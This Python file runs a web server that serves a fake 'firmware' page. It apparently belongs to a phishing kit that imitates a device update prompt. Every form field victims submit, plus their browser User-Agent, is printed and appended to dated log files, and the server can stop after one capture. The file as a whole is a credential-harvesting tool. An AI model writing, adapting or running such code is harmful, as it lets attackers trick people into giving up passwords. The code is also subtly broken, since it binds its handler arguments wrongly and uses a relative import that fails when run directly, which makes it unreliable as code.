#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from functools import partial
from .banner import *
import cgi
import os
import socket
import time
import datetime

class MyHandler(BaseHTTPRequestHandler):
    def __init__(self, getresp, postresp, auto_exit, *args, **kwargs):
        self.getresp = getresp
        self.postresp = postresp
        self.auto_exit = auto_exit
        super().__init__(*args, **kwargs)


    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_HEAD(self):
        self._set_headers()

    def openfile(self, file):
        with open(file) as f:
            return f.read()

    def do_GET(self):
        self._set_headers()
        # print (self.path)
        # print (parse_qs(self.path[2:]))
        file = openfile(self.getresp)
        self.wfile.write(bytes(file, "utf-8"))
        return
    
    
    def do_POST(self):
        self._set_headers()
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST'}
        )
        print(GREEN+"User-Agent: ", self.headers['user-agent'])
        data = ["\nUser-Agent: "+self.headers['user-agent']+"\n"]
        for key in form.keys():
            print(GREEN, key +': '+ form.getvalue(key)+RESET)
            data.append(key+": "+form.getvalue(key)+"\n")
        self.writefile(data)
        file = openfile(self.postresp)
        self.wfile.write(bytes(file, "utf-8"))
        if self.auto_exit:
            raise(KeyboardInterrupt)

    def writefile(self, data):
        if not os.path.exists("result"):
            os.mkdir("result")
        now = time.strftime('%m%d%Y')
        with open("result/"+now, "a+") as f:    
            f.writelines(data)

def http_run(server_class=HTTPServer, handler_class=MyHandler, host='', port=80):
    server_address = (host, port)
    handler_class = partial(handler_class, "../phishing-page/firmware/index.html", "../phishing-page/firmware/response.html")
    httpd = server_class(server_address, handler_class)
    print ('Server running at {}:{}...'.format(host, port))
    httpd.serve_forever()

def openfile(file):
    with open(file, "r") as f:
        return f.read()

if __name__ == "__main__":
    http_run()
